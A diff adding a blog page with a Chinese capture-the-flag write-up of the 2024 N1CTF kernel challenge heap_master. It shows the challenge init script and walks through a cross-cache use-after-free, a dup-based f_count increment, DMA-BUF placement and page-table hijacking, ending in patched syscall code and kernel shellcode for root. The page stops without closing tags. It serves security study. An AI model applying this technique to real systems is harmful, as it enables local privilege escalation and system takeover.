@@ -1,0 +1,978 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="0rb1t">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/11/10/2024-n1ctf-heap-master题解（dirtypage手法）/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="0x01.题目分析主要有两个函数safenote_init和safenote_ioctl。 safenote_init初始化了一个0xc0大小的kmem_cache。  safenote_ioctl存在add、delete、uaf_delete三个功能，分别对应0x1337、0x1338、0x1339。 add可以根据idx从init初始化的kmem_cache分配不超过0x100个堆块。  de">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024 N1CTF heap_master题解（DirtyPage手法）">
+<meta property="og:url" content="http://example.com/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x01.题目分析主要有两个函数safenote_init和safenote_ioctl。 safenote_init初始化了一个0xc0大小的kmem_cache。  safenote_ioctl存在add、delete、uaf_delete三个功能，分别对应0x1337、0x1338、0x1339。 add可以根据idx从init初始化的kmem_cache分配不超过0x100个堆块。  de">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110212639376.png">
+<meta property="og:image" content="http://example.com/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110212902185.png">
+<meta property="og:image" content="http://example.com/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110213013185.png">
+<meta property="og:image" content="http://example.com/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110213051122.png">
+<meta property="og:image" content="http://example.com/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110215628780.png">
+<meta property="og:image" content="http://example.com/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110220519790.png">
+<meta property="og:image" content="http://example.com/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110224420293.png">
+<meta property="og:image" content="http://example.com/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110231540008.png">
+<meta property="article:published_time" content="2024-11-10T12:52:10.000Z">
+<meta property="article:modified_time" content="2024-11-10T16:05:08.743Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="KernelPwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110212639376.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            2024 N1CTF heap_master题解（DirtyPage手法） -
+        
+        0rb1t&#39;s Blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Welcome to my blog.","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/8/4 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+    <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        0rb1t&#39;s Blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [40,0],
+                translateZ: 0,
+                opacity: [0,1],
+                filter: ['blur(5px)', 'blur(0px)'], // Starting from blurred to unblurred
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i,
+            }).add({
+                targets: '.ml13 .letter',
+                translateY: [0,-40],
+                opacity: [1,0],
+                filter: ['blur(0px)', 'blur(5px)'], // Ending from unblurred to blurred
+                easing: "easeInExpo",
+                duration: 1200,
+                delay: (el, i) => 100 + 30 * i,
+                complete: function() {
+                    hidePreloader(); // Call hidePreloader after the animation completes
+                }
+            });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                0rb1t&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">2024 N1CTF heap_master题解（DirtyPage手法）</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/redefine-avatar.svg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">0rb1t</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-11-10 20:52:10</span>
+        <span class="mobile">2024-11-10 20:52:10</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-11-11 00:05:08</span>
+            <span class="mobile">2024-11-11 00:05:08</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Pwn/">Pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/KernelPwn/">KernelPwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01.题目分析"></a>0x01.题目分析</h1><p>主要有两个函数safenote_init和safenote_ioctl。</p>
+<p>safenote_init初始化了一个0xc0大小的kmem_cache。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110212639376.png"
+                      alt="image-20241110212639376"
+                ></p>
+<p>safenote_ioctl存在add、delete、uaf_delete三个功能，分别对应0x1337、0x1338、0x1339。</p>
+<p>add可以根据idx从init初始化的kmem_cache分配不超过0x100个堆块。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110212902185.png"
+                      alt="image-20241110212902185"
+                ></p>
+<p>delete则会kfree并清空指针。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110213013185.png"
+                      alt="image-20241110213013185"
+                ></p>
+<p>uaf_delete只能执行一次，kfree但不清空指针，可以uaf实现double free。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110213051122.png"
+                      alt="image-20241110213051122"
+                ></p>
+<p>题目开启了nsjail沙盒</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#init</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t sysfs -o nodev,noexec,nosuid sysfs /sys</span><br><span class="line">mount -t proc -o nodev,noexec,nosuid proc /proc</span><br><span class="line">mount -t tmpfs -o noexec,nosuid,mode=0755 tmpfs /tmp</span><br><span class="line">mount -t devtmpfs -o nosuid,mode=0755 udev /dev</span><br><span class="line"><span class="built_in">mkdir</span> /dev/shm</span><br><span class="line">mount -t tmpfs shmfs -o size=1m /dev/shm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line"><span class="built_in">chmod</span> 600 /flag</span><br><span class="line"><span class="comment">#chown root:root /bin/root_shell</span></span><br><span class="line"><span class="comment">#chmod 4755 /bin/root_shell</span></span><br><span class="line">insmod vuln.ko</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/safenote</span><br><span class="line"><span class="built_in">chmod</span> 740 /startjail</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/dma_heap/system</span><br><span class="line"><span class="built_in">chown</span> ctf:ctf /jail</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ifconfig eth0 10.0.2.15</span><br><span class="line">route add default gw 10.0.2.2</span><br><span class="line">su root -c /startjail</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="0x02-攻击手法"><a href="#0x02-攻击手法" class="headerlink" title="0x02.攻击手法"></a>0x02.攻击手法</h1><p>可以看到题目使用kmem_cache将堆块与通用堆块进行隔离，所以无法直接利用uaf劫持系统结构体。</p>
+<h3 id="Cross-Cache-Attack-交叉缓存攻击"><a href="#Cross-Cache-Attack-交叉缓存攻击" class="headerlink" title="Cross-Cache Attack 交叉缓存攻击"></a>Cross-Cache Attack 交叉缓存攻击</h3><p>因为能够申请和释放足够多的堆块，所以当我们申请0x100个堆块并重新释放时，kmem_cache会因为free object过多而将完全释放的页表交还给伙伴系统。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110215628780.png"
+                      alt="image-20241110215628780"
+                ></p>
+<p>此时如果我们open大量的文件，针对file的kmem_cache就会因为free object不足重新从伙伴系统重新申请page，来补充堆块。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110220519790.png"
+                      alt="image-20241110220519790"
+                ></p>
+<p>此时就会有很大概率申请到我们曾经释放的page，我们就可以利用先前的uaf来攻击系统结构体了。</p>
+<h3 id="PTE劫持"><a href="#PTE劫持" class="headerlink" title="PTE劫持"></a>PTE劫持</h3><p><code>PTE：页表(Page Table Entry)</code>，内存分页存储机制中的构成元素，由PDE（页目录表）指向，每一个表项对应一个物理页。</p>
+<p>当我们使用mmap申请内存时并访问时，内核会将物理内存映射成虚拟内存，我们可以通过虚拟地址来访问物理地址，而这中间的转化则是基于<code>页表</code>完成的。</p>
+<p><code>页表</code>上存放着虚拟地址对应的实际物理地址，我们访问虚拟地址时，内核会根据虚拟地址对应的<code>页表</code>寻找相应的物理地址。</p>
+<p>而页表内存也是由伙伴系统分配的，故我们可以利用先前的uaf控制页表指针来实现任意物理地址的修改。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110224420293.png"
+                      alt="image-20241110224420293"
+                ></p>
+<h3 id="利用dup实现uaf-file的修改"><a href="#利用dup实现uaf-file的修改" class="headerlink" title="利用dup实现uaf_file的修改"></a>利用dup实现uaf_file的修改</h3><p>file结构体如下：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span> <span class="title">f_llist</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">f_rcuhead</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> f_iocb_flags;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment">* Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">spinlock_t</span> f_lock;</span><br><span class="line"><span class="type">fmode_t</span> f_mode;</span><br><span class="line"><span class="type">atomic_long_t</span> f_count;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">f_pos_lock</span>;</span></span><br><span class="line">…</span><br></pre></td></tr></table></figure></div>
+
+<p>当我们调用dup复制1个fd时，file-&gt;f_count会进行自增，并且这期间不会有对结构体内容的任何check。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//dup调用链</span></span><br><span class="line">dup(fd)</span><br><span class="line">    fget_raw(fd)</span><br><span class="line">        __fget(fd,<span class="number">0</span>)</span><br><span class="line">            __fget_files(current-&gt;files, fd, mask)</span><br><span class="line">                __fget_files_rcu(files, fd, mask)</span><br><span class="line">                    get_file_rcu(file)</span><br><span class="line">                        atomic_long_inc_not_zero(&amp;(x)-&gt;f_count)</span><br></pre></td></tr></table></figure></div>
+
+<p>其中f_count的偏移是0x38，这就意味着我们可以实现0x38偏移的任意自增。</p>
+<h3 id="DMA-BUF-Heap申请pte邻近内存"><a href="#DMA-BUF-Heap申请pte邻近内存" class="headerlink" title="DMA-BUF Heap申请pte邻近内存"></a>DMA-BUF Heap申请pte邻近内存</h3><p>DMA-BUF和mmap实际没有太大区别，都会映射一块物理页给虚拟内存。</p>
+<p>但是DMA-BUF映射的物理页的级别和mmap不一样，由DMA-BUF映射的物理页会邻近PTE的物理内存。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/11/10/2024-N1CTF-heap-master%E9%A2%98%E8%A7%A3%EF%BC%88DirtyPage%E6%89%8B%E6%B3%95%EF%BC%89/image-20241110231540008.png"
+                      alt="image-20241110231934848"
+                ></p>
+<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03.漏洞利用"></a>0x03.漏洞利用</h1><ul>
+<li>mmap申请0x400个0x8000的内存留着备用，此时还并不会将物理地址记录进pte。</li>
+<li>申请0x100个note，并全部释放，且第0x50个note使用uaf_delete释放。这样就可以将uaf的堆块交还给伙伴系统。</li>
+<li>申请0x100个file结构体，从伙伴系统取回uaf的堆块，然后利用残留的指针free掉其中的一个file，再申请0x100个file结构体，此时就会有两个file结构体重合。</li>
+<li>释放前0x100个file结构体，再次将uaf_file放回给伙伴系统。</li>
+<li>依次标记修改0x200个先前mmap的内存，此时会触发缺页异常，从而申请pte来存放其物理地址。这里就是为了创建0x200个pte，其中一个pte会和我们先前的file结构体重合。</li>
+<li>ioctl调用DMA_HEAP_IOCTL_ALLOC申请0x1000的物理内存，此时会申请到页表物理地址的下面，然后我们再依次标记修改后0x200个mmap内存，就会在DMA-BUF Heap下面申请pte。</li>
+<li>依次dup后0x100个file结构体，每次都循环dup 0x1000次，并判断每个mmap内存的标记，标记不符合就能得知uaf_file，以及重合的mmap内存是哪一个。这里不符合要把dup的0x1000次都close掉，防止文件描述符到达上限。</li>
+<li>munmap重合的内存，此时该内存的pte会空出来，然后我们在mmap映射DMA-BUF申请的物理地址，就会补上DMA-BUF的pte在空出来的位置。</li>
+<li>再去dup 0x1000 uaf_file，即可修改DMA-BUF的pte指向另一个pte的物理地址，从而完全劫持pte。</li>
+<li>劫持pte指向固定的物理地址泄露，内核基地址的物理地址，再次修改pte指向内核代码段。</li>
+<li>修改某系统调用的内核代码段，再syscall即可执行任意内核shellcode提权。</li>
+</ul>
+<p>这里能看出来步骤是十分繁琐的，有几部分解释不详细，我们这里再详细说一下。</p>
+<p>第一，mmap映射0x8000内存的原因，0x8000内存会创建0x40大小的pte，这样我们dup的时候修改0x38偏移的指针就可以修改0x8000内存段0x7000索引部分的physical指针。</p>
+<p>第二，mmap的标记，我们只需要在0x8000内存第0x7000处做上一个特殊标记就可以了，因为我们dup修改的是0x7000索引的physical指针，让其加0x1000就会指向下一个0x8000内存的头部，所以验证只需要验证mem[0x7000]是否为特殊标记即可。</p>
+<p>第三，DMA-BUF指向的物理地址加0x1000则是pte段，所以我们只需要将DMA-BUF的物理地址指针加0x1000就可以完全劫持pte。</p>
